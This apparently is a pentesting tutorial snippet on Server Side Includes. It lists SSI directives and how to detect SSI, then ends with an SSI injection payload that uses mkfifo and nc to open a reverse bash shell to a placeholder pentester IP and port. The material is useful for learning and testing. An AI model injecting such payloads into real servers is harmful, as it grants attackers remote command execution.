## Server Side Includes (SSI)

Server-side includes (`SSI`) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:

```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```

The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.

```
#Reverse Shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```
